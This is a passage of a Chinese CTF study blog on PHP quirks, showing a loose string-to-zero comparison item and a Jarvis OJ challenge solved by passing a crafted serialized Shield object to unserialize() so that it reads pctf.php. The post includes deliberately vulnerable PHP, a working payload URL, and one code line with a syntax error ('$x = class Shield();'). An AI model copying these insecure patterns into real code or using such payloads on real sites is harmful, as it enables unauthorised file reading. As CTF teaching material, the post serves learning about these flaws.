<code>0</code>比较<code>==</code>都返回<code>True</code></p><p>因为通过逻辑运算符让字符串和数字比较时，会自动将字符串转换为数字.而当字符串无法转换为数字时，其结果就为<code>0</code>了，然后再和另一个<code>0</code>比大小，结果自然为<code>ture</code>。注意：如果那个字符串是以数字开头的，如<code>6ldb</code>，它还是可以转为数字<code>6</code>的，然后和<code>0</code>比较就不等了（但是和<code>6</code>比较就相等）<br><code>if($str==0)</code> 判断 和 <code>if( intval($str) == 0 )</code> 是等价的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">可以验证：</div><div class="line">&lt;?php</div><div class="line">$str=&quot;s6s&quot;;</div><div class="line">if($str==0)&#123; echo &quot;返回了true.&quot;;&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>要字符串与数字判断不转类型方法有：</p><ul><li><p>方法一：<br><code>$str=&quot;字符串&quot;;if($str===0){ echo &quot;返回了true.&quot;;}</code></p></li><li><p>方法二：<br><code>$str=&quot;字符串&quot;;if($str==&quot;0&quot;){ echo &quot;返回了true.&quot;;} ,</code></p></li></ul><p>此题构造：<code>http://localhost/php_bugs/25.php?which=flag</code></p><p>资料：</p><ul><li><a href="https://zhidao.baidu.com/question/336186893.html" target="_blank" rel="external">PHP中字符串和数字 0 比较为什么返回true？</a></li></ul><h2 id="26-unserialize-序列化"><a href="#26-unserialize-序列化" class="headerlink" title="26 unserialize()序列化"></a>26 unserialize()序列化</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">&lt;!-- 题目：http:<span class="comment">//web.jarvisoj.com:32768 --&gt;</span></div><div class="line"></div><div class="line">&lt;!-- index.php --&gt;</div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</div><div class="line">    $x = <span class="keyword">new</span> Shield();</div><div class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</div><div class="line">        $x = unserialize($g);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</div><div class="line"></div><div class="line">&lt;!-- shield.php --&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="comment">//flag is in pctf.php</span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">        <span class="keyword">public</span> $file;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </div><div class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</div><div class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;!-- showimg.php --&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $f = $_GET[<span class="string">'img'</span>];</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</div><div class="line">        $f = base64_decode($f);</div><div class="line">        <span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></div><div class="line">        <span class="comment">//stripos — 查找字符串首次出现的位置（不区分大小写）</span></div><div class="line">        &amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</div><div class="line">            readfile($f);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"File not found!"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p>说明<code>flag</code>在<code>pctf.php</code>，但<code>showimg.php</code>中不允许直接读取<code>pctf.php</code>，只有在<code>index.php</code>中可以传入变量<code>class</code><br>，<code>index.php</code>中<code>Shield</code>类的实例<code>$X = unserialize($g)</code>，<code>$g = $_GET[&#39;class&#39;];</code>，<code>$X</code>中不知<code>$filename</code>变量，但需要找的是：<code>$filename = &quot;pctf.php&quot;</code>，现<code>$X</code>已知，求传入的<code>class</code>变量值。<br>可以进行序列化操作：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;!-- answer.php --&gt;</div><div class="line">&lt;?php</div><div class="line"></div><div class="line">require_once(&apos;shield.php&apos;);</div><div class="line">$x = class Shield();</div><div class="line">$g = serialize($x);</div><div class="line">echo $g;</div><div class="line"></div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;!-- shield.php --&gt;</div><div class="line">&lt;?php</div><div class="line">    //flag is in pctf.php</div><div class="line">    class Shield &#123;</div><div class="line">        public $file;</div><div class="line">        function __construct($filename = &apos;pctf.php&apos;) &#123;</div><div class="line">            $this -&gt; file = $filename;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        function readfile() &#123;</div><div class="line">            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  </div><div class="line">            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123;</div><div class="line">                return @file_get_contents($this-&gt;file);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p></p><p>得到：<br><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code><br>构造：<br><code>http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Link</a></li><li><a href="/tags/kali-linux">Kali</a></li><li><a href="/archives/">Archives</a></li><li><a href="http://github.com/sunnyelf">Projects</a></li><li><a href="/search/">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-extract变量覆盖"><span class="toc-number">1.</span> <span class="toc-text">01 extract变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-绕过trim函数过滤"><span class="toc-number">2.</span> <span class="toc-text">02 绕过trim函数过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-多重加密"><span class="toc-number">3.</span> <span class="toc-text">03 多重加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-SQL注入WITH-ROLLUP绕过"><span class="toc-number">4.</span> <span class="toc-text">04 SQL注入WITH ROLLUP绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-ereg正则-00截断"><span class="toc-number">5.</span> <span class="toc-text">05 ereg正则%00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-strcmp比较字符串"><span class="toc-number">6.</span> <span class="toc-text">06 strcmp比较字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-sha-函数比较绕过"><span class="toc-number">7.</span> <span class="toc-text">07 sha()函数比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-SESSION验证绕过"><span class="toc-number">8.</span> <span class="toc-text">08 SESSION验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-密码md5比较绕过"><span class="toc-number">9.</span> <span class="toc-text">09 密码md5比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-urldecode二次编码绕过"><span class="toc-number">10.</span> <span class="toc-text">10 urldecode二次编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-sql闭合绕过"><span class="toc-number">11.</span> <span class="toc-text">11 sql闭合绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-X-Forwarded-For绕过指定IP地址"><span class="toc-number">12.</span> <span class="toc-text">12 X-Forwarded-For绕过指定IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-md5加密相等绕过"><span class="toc-number">13.</span> <span class="toc-text">13 md5加密相等绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-intval函数向下取整"><span class="toc-number">14.</span> <span class="toc-text">14 intval函数向下取整</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-strpos数组绕过NULL与ereg正则-00截断"><span class="toc-number">15.</span> <span class="toc-text">15 strpos数组绕过NULL与ereg正则%00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-SQL注入or绕过"><span class="toc-number">16.</span> <span class="toc-text">16 SQL注入or绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-密码md5比较绕过"><span class="toc-number">17.</span> <span class="toc-text">17 密码md5比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-md5-函数-使用数组绕过"><span class="toc-number">18.</span> <span class="toc-text">18 md5()函数===使用数组绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-ereg-函数strpos-函数用数组返回NULL绕过"><span class="toc-number">19.</span> <span class="toc-text">19 ereg()函数strpos() 函数用数组返回NULL绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-十六进制与数字比较"><span class="toc-number">20.</span> <span class="toc-text">20 十六进制与数字比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-数字验证正则绕过"><span class="toc-number">21.</span> <span class="toc-text">21 数字验证正则绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-弱类型整数大小比较绕过"><span class="toc-number">22.</span> <span class="toc-text">22 弱类型整数大小比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-md5函数验证绕过"><span class="toc-number">23.</span> <span class="toc-text">23 md5函数验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-md5函数true绕过注入"><span class="toc-number">24.</span> <span class="toc-text">24 md5函数true绕过注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-switch没有break-字符与0比较绕过"><span class="toc-number">25.</span> <span class="toc-text">25 switch没有break 字符与0比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-unserialize-序列化"><span class="toc-number">26.</span> <span class="toc-text">26 unserialize()序列化</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&text=CTF中常见PHP特性学习笔记"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&is_video=false&description=CTF中常见PHP特性学习笔记"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=CTF中常见PHP特性学习笔记&body=Check out this article: https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&name=CTF中常见PHP特性学习笔记&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><ul><li id="toc"><a class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li><li id="share"><a class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li><li id="top" style="display:none"><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li><li id="menu"><a class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li></ul></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2018 Jing Ling</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Link</a></li><li><a href="/tags/kali-linux">Kali</a></li><li><a href="/archives/">Archives</a></li><li><a href="http://github.com/sunnyelf">Projects</a></li><li><a href="/search/">Search</a></li></ul></nav></div></footer></body></html><link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://cdn.bootcss.com/justifiedGallery/3.6.1/css/justifiedGallery.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script><script src="https://cdn.bootcss.com/justifiedGallery/3.6.1/js/jquery.justifiedGallery.min.js"></script><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/main.min.js"></script><script type="text/javascript">!function(e,a,t,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=a.createElement(t),s=a.getElementsByTagName(t)[0],o.async=1,o.src="//www.google-analytics.com/analytics.js",s.parentNode.insertBefore(o,s)}(window,document,"script",0,"ga"),ga("create","UA-97495608-1","auto"),ga("send","pageview")</script><script type="text/javascript">var disqus_shortname="sunnyelf";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script>